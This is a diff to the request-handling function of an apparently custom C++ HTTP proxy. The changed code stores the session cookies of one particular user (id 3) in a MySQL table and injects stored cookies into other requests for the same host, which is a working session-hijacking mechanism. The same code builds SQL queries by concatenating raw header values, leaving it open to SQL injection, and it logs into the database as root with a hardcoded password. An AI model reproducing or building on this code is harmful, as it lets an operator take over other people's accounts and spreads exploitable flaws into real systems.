@@ -256,12 +256,6 @@ int ClientSide::ProccessReceive(Stream* pStream)
 						mysql_real_connect(h, "localhost", "root", "123456", "ts", 0, NULL, 0);
 
 						mysql_query(h, "SET NAMES utf8");
-						//if(pUser->IsCapturing(m_pHttpRequest->GetHeader()->GetRequestLine()->GetUrl()->GetHost()))
-						if(pUser->GetId() == 3)
-						{
-
-							mysql_query(h, (string("REPLACE INTO `user_session` SET `user_id`=1, `create_time`='0', `url`='")+string(phost)+string("',`session_key`='")+string(m_pHttpRequest->GetHeader()->GetField(HTTP_COOKIE))+string("'")).c_str());
-						}
 						mysql_query(h, string(string("SELECT `session_key` FROM `user_session` WHERE `url`='")+string(phost)+string("'")).c_str());
 						MYSQL_RES* res = mysql_use_result(h);
 						MYSQL_ROW row = mysql_fetch_row(res);
@@ -271,7 +265,18 @@ int ClientSide::ProccessReceive(Stream* pStream)
 							m_pHttpRequest->GetHeader()->DeleteField((char*)"Cookie");
 							m_pHttpRequest->GetHeader()->AppendHeader((char*)"Cookie", 6, row[0], strlen(row[0]));
 						}
+						else
+						{
+							if(pUser->GetId() == 3)
+							{
+
+								mysql_query(h, (string("REPLACE INTO `user_session` SET `user_id`=1, `create_time`='0', `url`='")+string(phost)+string("',`session_key`='")+string(m_pHttpRequest->GetHeader()->GetField(HTTP_COOKIE))+string("'")).c_str());
+							}
+
+
+						}
 						mysql_free_result(res);
+						//if(pUser->IsCapturing(m_pHttpRequest->GetHeader()->GetRequestLine()->GetUrl()->GetHost()))
 						mysql_close(h);
 					}
 
